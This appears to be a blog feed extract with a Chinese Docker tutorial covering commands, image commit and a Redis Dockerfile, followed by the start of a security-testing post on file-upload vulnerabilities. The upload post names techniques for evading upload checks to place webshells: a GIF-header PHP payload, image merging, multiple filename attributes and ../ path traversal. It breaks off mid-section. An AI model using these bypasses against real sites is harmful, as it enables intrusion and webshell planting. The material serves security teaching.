<p>构建镜像可以使用docker commit命令和编辑Dockerfile文件后使用docker build命令构建</p>
<p>在linux中，通过命名空间与物理机的进程、网络、文件系统、CPU内存等资源的隔离。</p>
<p>容器可以打包成镜像后移动到另一个物理机器中，然后运行该镜像即可生成一个容器。</p>
<p>这样就完成了容器的移植。</p>
<p><em><strong>&mdash; 下面内容摘自docker官网</strong></em></p>
<p>将软件打包到标准化单元进行开发、装运和部署</p>
<p>容器是软件的标准单元，可将代码及其所有依赖项打包，以便应用程序从一个计算环境快速可靠地运行到另一个计算环境。Docker 容器镜像是一个轻量级、独立、可执行的软件包，包括运行应用程序所需的一切：代码、运行时间、系统工具、系统库和设置。</p>
<p>容器镜像在运行时变成容器，在docker容器的情况下 - 图像成为容器时，他们运行在docker引擎。针对 Linux 和 Windows 的应用程序，无论基础设施如何，容器化软件始终运行相同。容器将软件与环境隔离开来，并确保它工作一致，尽管开发和分期之间存在差异。</p>
<p>在码头发动机上运行的码头集装箱：</p>
<ul>
<li>**标准：**Docker 为容器创建了行业标准，因此它们可以在任何地方移植</li>
<li>**重量轻：**容器共享机器的操作系统内核，因此不需要每个应用程序的操作系统，从而提高服务器效率并降低服务器和许可成本</li>
<li>**安全：**在容器中应用更安全，Docker 提供业内最强的默认隔离功能</li>
</ul>
<h2 id="常用命令">常用命令</h2>
<ul>
<li>列出所有镜像</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker images
</code></pre></td></tr></table>
</div>
</div><ul>
<li>运行镜像</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker run
	-it ... /bin/bash以交互模式运行
	--name 运行镜像后生成的容器名称
	-p 8080:8081 将容器中的8081端口映射到本机的8080端口
	-v /home/data:/data 将容器中的/data目录映射到本地的/home/data目录
</code></pre></td></tr></table>
</div>
</div><ul>
<li>列出所有容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker ps -a
</code></pre></td></tr></table>
</div>
</div><ul>
<li>列出正在运行的容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker ps
</code></pre></td></tr></table>
</div>
</div><ul>
<li>启动容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker start 容器id/容器名称
</code></pre></td></tr></table>
</div>
</div><ul>
<li>停止容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker stop 容器id/容器名称
</code></pre></td></tr></table>
</div>
</div><ul>
<li>重启容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker restart 容器id/容器名称
</code></pre></td></tr></table>
</div>
</div><ul>
<li>进入容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker exec -it 容器id/容器名称 bash
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>容器和物理机相互拷贝文件</p>
<ul>
<li>
<p>将容器内/usr/local/redis/conf/redis.conf拷贝到物理机的当前目录\</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker cp 容器id/名称:/usr/local/redis/conf/redis.conf ./
</code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>将物理机当前目录下的redis.conf文件拷贝到容器内的/etc目录下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker cp ./redis.conf 容器id/名称:/etc/
</code></pre></td></tr></table>
</div>
</div></li>
</ul>
</li>
<li>
<p>删除容器（只能删除停止的容器）</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker rm 容器id/容器名称
</code></pre></td></tr></table>
</div>
</div><ul>
<li>删除镜像</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker rmi imageId
</code></pre></td></tr></table>
</div>
</div><h2 id="导出导入">导出导入</h2>
<h3 id="导出">导出</h3>
<p>1.提交容器修改，会新创建一个镜像</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">docker commit 10874ee33238 oracle:6120bak
</code></pre></td></tr></table>
</div>
</div><p>2.查看保存的镜像</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">docker images
</code></pre></td></tr></table>
</div>
</div><p>3.将镜像另存一个备份文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">docker save -o oracle.tar oracle:6120bak
</code></pre></td></tr></table>
</div>
</div><h3 id="导入">导入</h3>
<p>4.导入镜像</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">docker load &lt; oracle.tar
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">docker load -i oracle.tar
</code></pre></td></tr></table>
</div>
</div><h2 id="构建镜像">构建镜像</h2>
<p>构建镜像有两种方式，一种是基于已有镜像生成的容器，使用commit命令提交对容器的修改</p>
<p>一种是使用Dockerfile编译生成镜像</p>
<h3 id="commit">commit</h3>
<p>commit命令是依照当前容器创建一个镜像</p>
<p>可以理解为当对初始镜像run之后生成的容器做了修改之后，就可以使用commit命令来提交对该容器的修改</p>
<p>比如说一个centos7镜像，在run之后生成的容器上安装了一个gcc，此时就可以使用commit命令来提交对该容器的修改，此时commit的只是初始状态可当前状态之间有差异的部分，所以commit操作就很轻量</p>
<h4 id="示例">示例</h4>
<ul>
<li>运行一个镜像</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs ~]# docker run -dit --name centos7 ansible/centos7-ansible:1.8
fb26e1fd669bbccdd2fb0fdd1e1a312dcc815df4c45969de662416c71d752f39
</code></pre></td></tr></table>
</div>
</div><ul>
<li>查看正在运行中的容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs ~]# docker ps
CONTAINER ID  IMAGE                        COMMAND     CREATED          STATUS          PORTS     NAMES
fb26e1fd669b  ansible/centos7-ansible:1.8 &#34;/bin/bash&#34;  37 seconds ago   Up 33 seconds             centos7
</code></pre></td></tr></table>
</div>
</div><ul>
<li>进入centos7容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs ~]# docker exec -it centos7 bash
[root@fb26e1fd669b ansible]# 
</code></pre></td></tr></table>
</div>
</div><ul>
<li>退出centos7容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@fb26e1fd669b home]# exit
exit
</code></pre></td></tr></table>
</div>
</div><ul>
<li>安装gcc</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">步骤略
</code></pre></td></tr></table>
</div>
</div><ul>
<li>查看gcc是否安装成功</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) 
</code></pre></td></tr></table>
</div>
</div><ul>
<li>提交对容器的修改</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs gcc]# docker commit -m &#34;intall gcc&#34; fb26e1fd669b centos7:v2
sha256:48439ec1ff536277c2a4870ff068c2d0415751f9a21ee958af0bf0d873e0f9aa

参数说明：
-m：指定提交说明信息
fb26e1fd669b：容器id
centos7:v2：指定image名称和版本号
</code></pre></td></tr></table>
</div>
</div><ul>
<li>查看生成的镜像</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs gcc]# docker images
REPOSITORY                  TAG             IMAGE ID       CREATED          SIZE
centos7                     v2              48439ec1ff53   12 seconds ago   705MB
</code></pre></td></tr></table>
</div>
</div><ul>
<li>将旧的容器停止并删掉</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs gcc]# docker stop fb26e1fd669b
fb26e1fd669b
[root@pacs gcc]# docker rm fb26e1fd669b
fb26e1fd669b
</code></pre></td></tr></table>
</div>
</div><ul>
<li>运行新的镜像</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs gcc]# docker run -dit --name centos7 centos7:v2
c1f9774ca85e8fa652e29adaa39e62e2909e6dfb604aac09fb1a8f11e2a77d1d
</code></pre></td></tr></table>
</div>
</div><ul>
<li>查看生成的容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs gcc]# docker ps
CONTAINER ID   IMAGE          COMMAND        CREATED              STATUS                PORTS   NAMES
c1f9774ca85e   centos7:v2     &#34;/bin/bash&#34;    About a minute ago   Up About a minute             centos7
</code></pre></td></tr></table>
</div>
</div><ul>
<li>进入容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs gcc]# docker exec -it centos7 bash
[root@c1f9774ca85e ansible]# 
</code></pre></td></tr></table>
</div>
</div><ul>
<li>查看gcc是否安装</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@c1f9774ca85e ansible]# gcc -v 
Using built-in specs.
...
gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC)
</code></pre></td></tr></table>
</div>
</div><h3 id="dockerfile">Dockerfile</h3>
<p>dockerfile是一个文件，该文件中保存了将要创建的容器信息</p>
<p>然后使用docker build创建镜像</p>
<h4 id="dockefile">Dockefile:</h4>
<p>dockerfile可分为下面几个部分：</p>
<ul>
<li>基础镜像信息</li>
<li>维护者信息</li>
<li>镜像操作指令</li>
<li>容器启动时执行指令</li>
</ul>
<h4 id="dockerfile中的常用指令">Dockerfile中的常用指令</h4>
<ul>
<li>FROM：指定基础镜像，如创建一个nginx镜像，基础镜像可以指定centos或ubuntu，表示在该镜像的基础上构建，官方指定的是debian</li>
<li>ENV：用来定义镜像的环境变量</li>
<li>LABEL：指定镜像标签，一个镜像可以有多个标签</li>
<li>RUN：运行该镜像时执行的命令</li>
<li>ADD：添加文件到镜像中，如果是tar文件，会自动提取到指定的目录</li>
<li>WORKDIR：为RUN、CMD、COPY和AND设置当前工作目录</li>
<li>VOLUME：指定挂载到宿主机那个目录。一般用在docker run中，在运行镜像时使用-v指定目录挂载</li>
<li>USER：指定运行容器的用户</li>
<li>EXPOSE：指定容器运行后需要监听的端口</li>
<li>CMD：指定启动容器时运行的命令或脚本，只能有一条被执行，有多条时则执行最后一条</li>
</ul>
<h4 id="示例-1">示例：</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="k">FROM</span><span class="s"> centos:7</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">LABEL</span> <span class="nv">maintainer</span><span class="o">=</span><span class="s2">&#34;&lt;rui.u@foxmail.com&gt;&#34;</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">RUN</span> yum -y install gcc <span class="se">\
</span><span class="se"></span>    yum -y install make<span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">COPY</span> redis-5.0.10.tar.gz /usr/local<span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">RUN</span> tar -zxvf /usr/local/redis-5.0.10.tar.gz -C /usr/local <span class="o">&amp;&amp;</span> rm -f /usr/local/redis-5.0.10.tar.gz <span class="o">&amp;&amp;</span> mv /usr/local/redis-5.0.10 /usr/local/redis<span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /usr/local/redis</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">RUN</span> make <span class="o">&amp;&amp;</span> make install <span class="o">&amp;&amp;</span> rm -rf redis.conf<span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">COPY</span> redis.conf ./<span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">EXPOSE</span><span class="s"> 6379</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">ENTRYPOINT</span> <span class="p">[</span><span class="s2">&#34;/usr/local/redis/src/redis-server&#34;</span><span class="p">,</span><span class="s2">&#34;/usr/local/redis/redis.conf&#34;</span><span class="p">]</span><span class="err">
</span><span class="err"></span><span class="k">CMD</span> <span class="p">[]</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li>把Dockerfile文件中所需的文件放到与Dockerfile的同级目录，</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs dockerfi]# ls
Dockerfile  redis-5.0.10.tar.gz  redis.conf
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>执行命令编译镜像文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs dockerfi]# docker build -t redis:rui ./
</code></pre></td></tr></table>
</div>
</div><ul>
<li>-t：指定编辑好的镜像的name和tag</li>
<li>./：指定Dockerfile的位置</li>
</ul>
</li>
<li>
<p>编译完成之后使用docker images查看编译好的镜像</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs dockerfi]# docker images
REPOSITORY                   TAG             IMAGE ID       CREATED         SIZE
redis                        rui             c63f66127130   9 minutes ago   556MB
</code></pre></td></tr></table>
</div>
</div><ul>
<li>执行下面命令运行镜像</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs dockerfi]# docker run -d --name redis -p 6379:6379 redis:rui
474523dd27912b981a828789c27d640891dbf350e96b00f575e5479da1bdf636
[root@pacs dockerfi]# 
</code></pre></td></tr></table>
</div>
</div><ul>
<li>查看正在运行的容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs dockerfi]# docker ps
CONTAINER ID   IMAGE       COMMAND                  CREATED         STATUS         PORTS                       NAMES
474523dd2791   redis:rui   &#34;/usr/local/redis/sr…&#34;   5 seconds ago   Up 2 seconds   0.0.0.0:6379-&gt;6379/tcp      redis
</code></pre></td></tr></table>
</div>
</div><ul>
<li>进入容器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@pacs dockerfi]# docker exec -it redis bash
[root@474523dd2791 /]#
</code></pre></td></tr></table>
</div>
</div><ul>
<li>测试redis</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@474523dd2791 /]# redis-cli 
127.0.0.1:6379&gt; ping
(error) NOAUTH Authentication required.
127.0.0.1:6379&gt; quit
[root@474523dd2791 /]# redis-cli 
127.0.0.1:6379&gt; auth admin
OK
127.0.0.1:6379&gt; ping
PONG
127.0.0.1:6379&gt; set test 1
OK
127.0.0.1:6379&gt; get test
&#34;1&#34;
127.0.0.1:6379&gt; del test
(integer) 1
127.0.0.1:6379&gt; get test
(nil)
127.0.0.1:6379&gt; 
</code></pre></td></tr></table>
</div>
</div><h4 id="遇到的麻烦">遇到的麻烦</h4>
<ul>
<li>
<p>docker run 后面不能跟/bin/bash，否则会覆盖掉Dockerfile中cmd后面执行的命令，</p>
<p>也会导致容器进程不能维持运行，</p>
<p>可是我运行的参数写到了ENTRYPOINT后面</p>
<p>pull的其它镜像一般都是使用-dit /bin/bash方式运行，并没有发现有什么问题</p>
<p>可能还是我的Dockerfile写的有问题</p>
</li>
<li>
<p>还是需要继续学习啊</p>
</li>
</ul>
<h2 id="学习资料">学习资料</h2>
<p>docker官方文档：</p>
<p><a href="https://docs.docker.com/engine/reference/builder/#shell">https://docs.docker.com/engine/reference/builder/#shell</a></p>
<p>csdn：</p>
<p><a href="https://blog.csdn.net/wangziyang777/article/details/114277452">https://blog.csdn.net/wangziyang777/article/details/114277452</a></p>
<p><a href="https://blog.csdn.net/guyan0319/article/details/81020252">https://blog.csdn.net/guyan0319/article/details/81020252</a></p>
<p><a href="https://blog.csdn.net/persistencegoing/article/details/93713869">https://blog.csdn.net/persistencegoing/article/details/93713869</a></p>
<p>redis官方镜像dockerfile（看的迷迷糊糊😭）：</p>
<p><a href="https://github.com/docker-library/redis/blob/147762b57f4d4391ba6cf8fbd1e7590a606643ef/5/Dockerfile">https://github.com/docker-library/redis/blob/147762b57f4d4391ba6cf8fbd1e7590a606643ef/5/Dockerfile</a></p>
<p>dockerhub：</p>
<p><a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
]]></description>
</item><item>
    <title>安全测试之-文件上传</title>
    <link>https://testoai.github.io/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
    <pubDate>Sun, 23 May 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
    <description><![CDATA[<h2 id="文件上传漏洞">文件上传漏洞</h2>
<p>当文件上传点未对上传的文件进行严格的验证和过滤时，就容易造成任意文件上传，比如webshell文件</p>
<p>如果文件上传的目录没有限制执行权限，导致上传的动态文件可以正常执行并且访问，即造成了文件上传漏洞</p>
<h2 id="什么是webshell">什么是webshell</h2>
<p>webshell简称网页后门，运行在web应用上的远程控制程序</p>
<p>其实就是一个网页，由PHP、jsp、asp、asp.net等之类的web应用程序语言开发，但是webshell并不具备常见网页的功能，例如登录、注册、信息展示功能，一般会具备文件管理、端口扫描、提权、获取信息等功能。拥有较为完善功能的webshell称之为大马。功能简单的webshell称为小马</p>
<h2 id="上传检测流程">上传检测流程</h2>
<ul>
<li>1.前端提交
<ul>
<li>JavaScript检测</li>
<li>Flash AS检测</li>
</ul>
</li>
<li>2.数据传输
<ul>
<li>WAF拦截</li>
<li>IPS拦截</li>
</ul>
</li>
<li>服务端处理
<ul>
<li>扩展名检测</li>
<li>MIME TYPE检测（文件参数中的content-type）</li>
<li>文件格式检测</li>
<li>内容检测（同WAF/IDS）</li>
</ul>
</li>
<li>写入文件系统
<ul>
<li>文件重命名</li>
<li>杀毒软件查杀</li>
</ul>
</li>
<li>访问文件
<ul>
<li>无执行权限</li>
<li>未知位置</li>
</ul>
</li>
</ul>
<h2 id="客户端检测绕过">客户端检测绕过</h2>
<ul>
<li>
<p>1.JavaScript检测：通过浏览器提交上传请求前，出发检测用JS脚本进行检测，如普通表单上传</p>
</li>
<li>
<p>2.Flash AS脚本检测：上传用Flash中，提交上传请求前，触发检测用AS脚本进行检测</p>
</li>
<li>
<p>3.APP上传检测：检测写在APP客户端代码中，或者所调用的HTML页面中</p>
</li>
<li>
<p>客户端检测一般只检测文件扩展名</p>
</li>
<li>
<p>客户端进行的检测可通过对客户端代码的修改或拦截请求修改报文即可绕过</p>
</li>
</ul>
<h3 id="前端javascript检测绕过">前端JavaScript检测绕过</h3>
<ul>
<li>1.查看onchange、onsubmit等事件
<ul>
<li>onchange事件会在域的内容改变时发生</li>
<li>onsubmit事件会在表单的确认按钮被点击时发生，如下图示例</li>
</ul>
</li>
<li>2.删掉相关事件中的检测函数</li>
</ul>
<h2 id="提交报文修改检测绕过">提交报文修改检测绕过</h2>
<ul>
<li>1.先选择正常的文件进行上传</li>
<li>2.然后对上传文件的包进行截获，修改，重新上传</li>
<li>这种方法可以绕过前端检测</li>
</ul>
<h2 id="服务端检测绕过">服务端检测绕过</h2>
<ul>
<li>服务端监测点
<ul>
<li>1.文件扩展名</li>
<li>2.MIME/TYPE类型，该参数是由浏览器自动生成的，根据上传时选择的文件的扩展名进行mime/type的选择</li>
<li>3.文件内容</li>
</ul>
</li>
</ul>
<h3 id="mime类型检测绕过">MIME类型检测绕过</h3>
<p>MIME(Multipurpose Interent Mail Extensions)是描述消息内容类型的因特网标准</p>
<p>MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据</p>
<p>浏览器会自动根据上传的文件扩展名，对应到相应的MIME类型上</p>
<ul>
<li>常见的MIME TYPE白名单</li>
</ul>
<table>
<thead>
<tr>
<th>扩展名</th>
<th>MIME TYPE</th>
</tr>
</thead>
<tbody>
<tr>
<td>jpg</td>
<td>image/jpeg</td>
</tr>
<tr>
<td>png</td>
<td>image/png</td>
</tr>
<tr>
<td>txt</td>
<td>text/plain</td>
</tr>
<tr>
<td>zip</td>
<td>application/zip</td>
</tr>
<tr>
<td>doc</td>
<td>application/msword</td>
</tr>
</tbody>
</table>
<h3 id="文件内容检测绕过">文件内容检测绕过</h3>
<ul>
<li>
<p>1.简单文件头检测</p>
<p>文件头是位于文件开头的一段承担一定任务的数据，一般都在开头部分</p>
<p>文件头的其实部分中一般开头标记文件类型</p>
<p>如GIF的文件头为GIF89a或GIF87a</p>
</li>
<li>
<p>绕过：这种只对文件头部进行简单匹配的方法，可以通过在上传的文件前追加合法的文件头进行绕过</p>
<p>如：<code>GIF89a&lt;?php phpinfo();?&gt;</code></p>
</li>
<li>
<p>2.完整文件结构检测</p>
<p>通过调用图像函数（如getimagesize/imagecreatefromgif/imagecreatefrompng），进行文件检测是否为图像，需要文件内容保持相对完整，所以无法通过上面追加头部起始字节的方法进行绕过</p>
</li>
<li>
<p>绕过</p>
<p>这种检测可以将图片文件与欲上传文件进行合并来绕过检测</p>
<p>先搞一个小的图片文件，然后使用copy命令把要上传的非法文件进行合并，然后上传，就可以绕过完整文件检测了</p>
</li>
<li>
<p>3.恶意文件内容检测</p>
<p>检测提交的文件中是否包含webshell等数据</p>
</li>
</ul>
<h2 id="文件上传小技巧">文件上传小技巧</h2>
<ul>
<li>
<p>1.文件参数多为filename属性</p>
<p>文件上传过程中，如果存在waf拦截一些扩展名，可以通过尝试多个filename属性</p>
</li>
<li>
<p>2.目录可控时，可以尝试使用目录穿越的方法（../）</p>
<p>目录可控：程序在指定路径下的指定后缀的文件禁止访问，这种情况下如果非法程序上传成功了，但是也无法执行的</p>
<p>此时需要抓包，将filename属性添加上../，意思是上传到指定目录的上一级，这样访问上一级就能绕过该方式的控制了</p>
</li>
</ul>
<h2 id="解析漏洞">解析漏洞</h2>
<ul>
<li>
<p>1.IIS/Nginx+PHP fastcgi取值错误解析漏洞（配置错误）</p>
<p>开启了cgi.fix_pathinfo，如果开启后，执行文件不存在，会继续查找上一级文件是否存在，</p>
</li>
</ul>
<h2 id="绕过技巧">绕过技巧</h2>
<h3 id="重绘图">重绘图</h3>
<ul>
<li>应用调用图片库对上传的文件进行了图像转换，所以即使将图片与文件合并，也会将尾部转换掉，无法使用前面的方法进行文件上传</li>
<li>解决方法：
